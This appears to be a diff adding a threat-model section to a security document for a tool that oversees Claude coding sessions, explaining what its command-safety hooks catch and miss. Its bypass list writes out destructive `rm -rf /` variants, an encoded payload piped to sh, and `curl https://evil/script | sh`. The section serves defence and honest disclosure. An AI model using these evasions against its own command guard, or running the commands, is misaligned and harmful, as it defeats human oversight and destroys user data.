@@ -125,6 +125,52 @@ If you want additional safety:
 
 ---
 
+## Threat Model for Command Analysis
+
+Conductor includes two command safety layers:
+
+1. **`remote-control.py` `_analyze_bash_command()`** — decides whether to auto-approve Bash commands via the RC WebSocket
+2. **`hooks/conductor-guard.js` `analyzeBashCommand()`** — blocks dangerous commands at the PreToolUse hook level
+
+**Both layers use tokenized command analysis (via `shlex.split` in Python and a naive tokenizer in Node), not substring/regex matching.**
+
+### What These Layers ARE
+
+- **Defense in depth against honest mistakes** — you asked Claude to push a branch, it tries `git push --force` by accident, the layer catches it
+- **A safety net, not a sandbox** — Tokenization catches common flag cluster bypasses like `git push -fu` that substring checks miss
+- **A speed bump between Claude and your filesystem** — gives you time to review escalations via Telegram or human approval
+
+### What These Layers ARE NOT
+
+These checks are **not a security boundary against adversarial input**. They can be bypassed by:
+
+- **Variable expansion**: `CMD="rm -rf /"; $CMD`
+- **Command substitution**: `$(echo "rm -rf /")` or backticks
+- **Encoded payloads**: `echo cm0gLXJmIC8= | base64 -d | sh`
+- **Shell wrappers**: `bash -c "..."`, `python -c "..."`, `node -e "..."`, `eval "..."`
+- **Indirect execution**: writing a script with `Write` tool, then executing it
+- **Network downloads**: `curl https://evil/script | sh`
+- **Alternative interpreters**: `perl -e`, `ruby -e`, `awk 'BEGIN{system("...")}'`
+
+The analyzer **does** flag `sh -c`, `bash -c`, `python -c`, and pipe-to-shell patterns as dangerous (escalate), because it can't see inside them.
+
+### The Real Security Boundaries
+
+In order of importance:
+
+1. **The OAuth token itself** — protects the API from unauthorized access
+2. **Human-in-the-loop approval** — the user hits Y to approve each tool by default
+3. **Conductor flags** — `set_flag(session_id, "block")` pauses a session completely via the hook
+4. **Pattern analysis** (this layer) — last-resort speed bump against obvious footguns
+
+Do not disable human approval in a session and rely only on the pattern analyzer. It will catch `git push -fu` but not `bash -c "git push --force"`.
+
+### Reporting Bypasses
+
+If you find a command that the analyzer auto-approves but should have been escalated, please open an issue with the exact command string. We can add it to the test suite and strengthen the analyzer. Thanks to @consigcody94 for the first bypass report (#2) that prompted this rewrite.
+
+---
+
 ## Reporting Vulnerabilities
 
 If you discover a security issue, please open a private security advisory on GitHub or email the maintainer directly rather than opening a public issue. Token handling is the single most sensitive area of this project — responsible disclosure is appreciated.
